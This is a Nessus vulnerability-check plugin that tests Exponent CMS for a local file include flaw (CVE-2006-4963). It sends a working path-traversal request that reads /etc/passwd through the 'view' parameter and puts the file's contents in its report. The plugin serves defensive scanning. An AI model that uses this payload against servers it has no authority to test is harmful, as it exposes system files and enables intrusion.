#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is prone to a
local file include issue. 

Description :

The remote host is running Exponent CMS, an open-source content
management system written in PHP. 

The version of Exponent CMS installed on the remote host fails to
properly sanitize user-supplied input to the 'view' parameter before
using it in the 'modules/calendarmodule/class.php' script to include
PHP code as part of its templating system.  Regardless of PHP's
'magic_quotes_gpc' and 'register_globals' settings, an unauthenticated
remote attacker may be able to exploit this issue to view arbitrary
files or to execute arbitrary PHP code on the remote host, subject to
the privileges of the web server user id. 

See also :

http://milw0rm.com/exploits/2391
http://www.exponentcms.org/index.php?action=view&id=35&module=newsmodule

Solution :

Apply the patches for 96.3 as described in the vendor's advisory
referenced above. 

Risk factor :

Medium / CVSS Base Score : 4.6
(AV:R/AC:L/Au:NR/C:P/I:P/A:N/B:N)";


if (description)
{
  script_id(22412);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2006-4963");
  script_bugtraq_id(20111);

  script_name(english:"Exponent CMS view Parameter Local File Include Vulnerability");
  script_summary(english:"Tries to read a local file in Exponent CMS");

  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/exponent", "/site", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Grab index.php.
  file = "../../../../../../../../../../etc/passwd%00";
  req = http_get(
    item:string(
      dir, "/index.php?",
      "src=1&",
      "_common=1&",
      "time=", unixtime(), "&",
      "action=show_view&",
      "module=calendarmodule&",
      "view=", file
    ),
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if there's an entry for root.
  if (egrep(pattern:"root:.*:0:[01]:", string:res))
  {
    contents = res;
    contents = strstr(contents, "perform this operation.");
    if (contents) contents = contents - "perform this operation.";
    if (contents) contents = contents - strstr(contents, "</td");

    if (contents && report_verbosity)
      report = string(
        desc,
        "\n\n",
       "Plugin output :\n",
        "\n",
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        contents
      );
    else report = desc;

    security_warning(port:port, data:report);
    exit(0);
  }
}
